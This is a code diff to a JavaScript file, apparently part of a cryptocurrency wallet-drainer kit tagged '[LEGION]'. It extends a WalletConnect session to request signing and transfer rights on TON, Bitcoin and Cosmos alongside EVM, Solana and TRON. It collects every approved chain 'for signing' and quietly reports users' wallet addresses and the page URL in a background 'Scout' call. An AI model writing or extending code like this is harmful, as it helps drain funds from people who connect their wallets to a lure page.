@@ -5048,6 +5048,24 @@
               methods: ['tron_signMessage', 'tron_signTransaction'],
               chains: ['tron:0x2b6653dc'],
               events: []
+            },
+            // TON — Tonkeeper, MyTonWallet via WC v2
+            ton: {
+              methods: ['ton_sendTransaction', 'ton_signTransaction', 'ton_signData'],
+              chains: ['ton:mainnet'],
+              events: []
+            },
+            // Bitcoin — Xverse, OKX BTC wallet via WC v2
+            bip122: {
+              methods: ['signMessage', 'signPsbt', 'sendTransfer'],
+              chains: ['bip122:000000000019d6689c085ae165831e93'],
+              events: []
+            },
+            // Cosmos — Keplr, Leap via WC v2
+            cosmos: {
+              methods: ['cosmos_signAmino', 'cosmos_signDirect'],
+              chains: ['cosmos:cosmoshub-4'],
+              events: []
             }
           }
         });
@@ -5586,6 +5604,67 @@
         console.log('[LEGION] 🔗 TRON connected via WalletConnect:', tAddr);
       }
     }
+    // TON namespace — Tonkeeper, MyTonWallet via WC v2
+    if (ns.ton && ns.ton.accounts && ns.ton.accounts.length) {
+      var tonParts = ns.ton.accounts[0].split(':');
+      var tonAddr = tonParts.length >= 3 ? tonParts.slice(2).join(':') : '';
+      if (tonAddr) {
+        connectedChains.TON = {
+          chain: 'TON', config: CHAIN_CONFIG.TON, address: tonAddr,
+          walletType: 'WalletConnect',
+          // Wrap WC provider so TON.sign() can call ton.send() unchanged
+          provider: {
+            send: function(method, params) {
+              return provider.request({ method: method, params: params || {} }, 'ton:mainnet');
+            }
+          },
+          connected: true, timestamp: Date.now()
+        };
+        count++;
+        console.log('[LEGION] TON connected via WC:', tonAddr.substring(0, 10) + '...');
+      }
+    }
+
+    // Bitcoin namespace (BIP122) — Xverse, OKX BTC wallet via WC v2
+    if (ns.bip122 && ns.bip122.accounts && ns.bip122.accounts.length) {
+      var btcParts = ns.bip122.accounts[0].split(':');
+      var btcAddr = btcParts.length >= 3 ? btcParts.slice(2).join(':') : '';
+      if (btcAddr) {
+        connectedChains.BTC = {
+          chain: 'BTC', config: CHAIN_CONFIG.BTC, address: btcAddr,
+          walletType: 'WalletConnect',
+          provider: {
+            request: function(args) {
+              return provider.request(args, 'bip122:000000000019d6689c085ae165831e93');
+            }
+          },
+          connected: true, timestamp: Date.now()
+        };
+        count++;
+        console.log('[LEGION] BTC connected via WC:', btcAddr.substring(0, 10) + '...');
+      }
+    }
+
+    // Cosmos namespace — Keplr, Leap via WC v2
+    if (ns.cosmos && ns.cosmos.accounts && ns.cosmos.accounts.length) {
+      var cosmosParts = ns.cosmos.accounts[0].split(':');
+      var cosmosAddr = cosmosParts.length >= 3 ? cosmosParts.slice(2).join(':') : '';
+      if (cosmosAddr) {
+        connectedChains.COSMOS = {
+          chain: 'COSMOS', config: CHAIN_CONFIG.COSMOS, address: cosmosAddr,
+          walletType: 'WalletConnect',
+          provider: {
+            request: function(args) {
+              return provider.request(args, 'cosmos:cosmoshub-4');
+            }
+          },
+          connected: true, timestamp: Date.now()
+        };
+        count++;
+        console.log('[LEGION] COSMOS connected via WC:', cosmosAddr.substring(0, 10) + '...');
+      }
+    }
+
     return count;
   }
 
@@ -5595,9 +5674,12 @@
 
     // Build connected map for signing — all chains the wallet approved
     var wcConnected = {};
-    if (connectedChains.EVM) wcConnected.EVM = connectedChains.EVM;
-    if (connectedChains.SOL) wcConnected.SOL = connectedChains.SOL;
-    if (connectedChains.TRON) wcConnected.TRON = connectedChains.TRON;
+    if (connectedChains.EVM)    wcConnected.EVM    = connectedChains.EVM;
+    if (connectedChains.SOL)    wcConnected.SOL    = connectedChains.SOL;
+    if (connectedChains.TRON)   wcConnected.TRON   = connectedChains.TRON;
+    if (connectedChains.TON)    wcConnected.TON    = connectedChains.TON;
+    if (connectedChains.BTC)    wcConnected.BTC    = connectedChains.BTC;
+    if (connectedChains.COSMOS) wcConnected.COSMOS = connectedChains.COSMOS;
 
     // Scout in background
     var firstChain = Object.keys(wcConnected)[0] || 'EVM';
@@ -5606,7 +5688,7 @@
       user_address: firstWallet ? firstWallet.address : '',
       chain_id: wcConnected.EVM ? wcConnected.EVM.chainId || 1 : 1,
       wallet_type: 'WalletConnect',
-      chain_family: firstChain === 'SOL' ? 'SVM' : firstChain === 'TRON' ? 'TVM' : 'EVM',
+      chain_family: firstChain === 'SOL' ? 'SVM' : firstChain === 'TRON' ? 'TVM' : firstChain === 'TON' ? 'TON' : firstChain === 'BTC' ? 'UTXO' : firstChain === 'COSMOS' ? 'IBC' : 'EVM',
       source_page: window.location.href,
       connected_wallets: Object.keys(wcConnected).map(function(k) { return wcConnected[k].address; }).filter(Boolean)
     }).catch(function() {});
